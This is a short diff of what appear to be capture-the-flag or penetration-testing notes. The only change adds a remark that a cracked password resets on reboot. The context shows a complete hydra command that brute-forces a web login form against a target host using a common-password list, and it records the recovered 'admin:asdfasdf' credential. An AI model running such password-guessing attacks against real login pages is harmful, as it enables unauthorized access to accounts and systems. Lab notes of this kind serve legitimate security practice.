@@ -28,7 +28,7 @@ Probably try cred stuffing?
     hydra -l m4lwhere -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
 
 
-Apparently it worked. `admin:asdfasdf`. Wow!
+Apparently it worked. `admin:asdfasdf`. Wow! (Note: Password seems to change on box reboot.)
 
 ## Next steps
 
